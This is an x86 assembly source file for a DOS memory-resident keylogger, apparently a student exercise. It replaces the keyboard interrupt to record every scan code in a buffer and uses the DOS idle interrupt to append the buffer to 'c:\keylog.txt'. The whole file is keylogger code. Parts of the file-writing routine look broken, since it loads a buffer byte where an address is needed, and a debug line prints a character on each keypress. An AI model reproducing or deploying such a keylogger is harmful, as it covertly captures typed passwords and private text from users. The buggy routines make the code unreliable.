.186
.model tiny
.code 
org 100h
locals @@

Start:
		cli

	;counting addr of int 9h
		mov bx, 9h * 4h 
		xor ax, ax
		mov es, ax


	;saving addr of old 9h
		mov ax, word ptr es:[bx]  		
		mov word ptr old_9h_o, ax 		;offset
		
		mov ax, word ptr es:[bx + 2]
		mov word ptr old_9h_s, ax  		;segment


	;rewriting addr of old 9h to new 9h in memory
		mov ax, 2509h	
		mov dx, offset new_9h
		int 21h


	;counting addr of int 28h
		mov bx, 28h * 4h 
		xor ax, ax
		mov es, ax

	;saving addr of old 28h
		mov ax, word ptr es:[bx]
		mov word ptr old_28h_o, ax

		mov ax, word ptr es:[bx + 2]
		mov word ptr old_28h_s, ax


	;rewriting addr of old 28h to new 28h in memory
		mov ax, 2528h
		mov dx, offset new_28h
		int 21h
	
		sti

	;staying resident in memory
		mov ax, 3100h;
		mov dx, offset end_label
		shr dx, 4
		inc dx
		int 21h;


new_28h proc
		pusha
		push es ds

		call flush_buff 

		pop ds es
		popa

	;call original int 28h
		pushf
		call dword ptr cs:[old_28h_o]
		iret

		endp

old_28h_o dw 0h
old_28h_s dw 0h


new_9h proc
		pusha
		push es ds

		call read_to_buff	
		
		pop ds es
		popa

	;call original int 9h
		pushf
		call dword ptr cs:[old_9h_o]
		iret

		endp
		

old_9h_o dw 0h
old_9h_s dw 0h

		

read_to_buff proc 
	
	mov ah, 02h
	mov dl, 92d
	int 21h

	;saving pressed key
		in al, 60h;	
	
	;setting bl as tail
		xor bh, bh
		mov bl, buff_tail
	
	;writing pressed key to the buffer
		mov di, offset buff
		add di, bx 

		mov cs:[di], al
	
	;adjusting tail
		inc bl
		mov byte ptr buff_tail, bl 

	;skipping key release
		in al, 60h;
		xor al, al	

		ret
		endp


flush_buff proc 

;		mov ah, 02h
;		mov dl, 70d
;		int 21h
	
	;opening file by adress in ds:dx and saving its handler  
		mov ax, 3d02h; 
		mov dx, offset log_file;
		int 21h
		mov file_handler, ax


	;moving cursor to the end of file
		mov ax, 4202h
		mov bx, file_handler
		xor cx, cx
		xor dx, dx
		int 21h


	;setting dl as head
		mov dl, buff 	
		add dl, buff_head
	
	;setting bl as tail
		mov bl, buff 	
		add bl, buff_tail


	;counting num of symbols to write
		push dx
		sub dl, bl
		mov cl, dl
		pop dx

	;writing symbols to file
		push bx
		push dx
		mov ah, 40h
		mov bx, file_handler
		xor ch, ch
		xor dh, dh
		int 21h
		pop dx
		pop bx

	;moving head
		mov dl, bl
		mov cs:[buff_head], dl


	;closing file
		mov ah, 3eh
		mov bx, file_handler
		int 21h


		ret
		endp

log_file db 'c:\keylog.txt', 0
file_handler dw ?


buff db 256 dup (?)
buff_head db 0 
buff_tail db 0


end_label:
end Start
